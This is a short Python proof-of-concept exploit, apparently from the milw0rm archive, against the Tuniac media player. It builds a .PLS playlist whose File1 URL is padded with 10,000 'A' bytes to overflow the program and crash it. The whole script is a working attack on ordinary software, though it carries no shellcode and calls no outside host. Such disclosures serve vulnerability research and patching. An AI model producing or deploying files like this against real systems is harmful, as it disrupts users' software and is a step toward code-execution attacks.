#!/usr/bin/env python
# Tuniac v.090517c (.PLS) Crash PoC
# By : zAx
# http://sourceforge.net/projects/tuniac/files/tuniac/090517/Tuniac_Setup_090517c.exe/download

buffer = ("[playlist]\x0ANumberOfEntries=1\x0AFile1=http://" + "\x41" * (10000));

f = open('Crash_Poc.PLS','w');
f.write(buffer);
f.close();

# milw0rm.com [2009-09-14]
